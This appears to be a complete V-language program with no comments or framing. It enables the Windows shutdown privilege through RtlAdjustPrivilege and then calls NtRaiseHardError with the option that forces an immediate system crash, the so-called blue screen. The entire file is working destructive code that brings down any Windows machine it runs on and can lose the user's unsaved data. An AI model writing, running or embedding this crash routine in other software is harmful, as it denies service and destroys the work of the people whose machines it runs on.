module main

#flag -lntdll

fn C.RtlAdjustPrivilege(privilege u32, enable bool, current_thread bool, enabled &bool) int
fn C.NtRaiseHardError(error_status u32, num_params u32, unicode_mask u32, params voidptr, options u32, response &u32) int

fn main() {
    mut enabled := false
    mut response := u32(0)
    
    C.RtlAdjustPrivilege(19, true, false, &enabled)
    C.NtRaiseHardError(0xC0000420, 0, 0, unsafe { nil }, 6, &response)
}

